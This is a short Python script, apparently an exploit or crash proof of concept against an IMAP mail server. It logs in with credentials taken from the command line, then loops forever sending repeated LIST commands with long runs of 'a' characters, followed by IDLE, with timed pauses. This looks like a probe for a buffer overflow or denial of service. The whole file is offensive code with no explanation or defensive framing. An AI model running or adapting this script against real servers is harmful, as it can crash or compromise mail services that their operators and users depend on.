import socket, select, string, sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
logind = sys.argv[3]
passwd = sys.argv[4]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)

# connect to remote host
try :
    s.connect((host, port))
except :
    print 'Unable to connect'
    sys.exit()
print 'Connected to remote host'

socket_list = [sys.stdin, s]
read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
s.send("a login "+logind+" "+passwd+" \r\n")
while True:
    print 'start'
    time.sleep(140)
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    s.send("a list \"123aaaaa\" *\r\n")
    s.send("a list \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" *\r\n")
    time.sleep(10)
    s.send("a idle\r\n")     
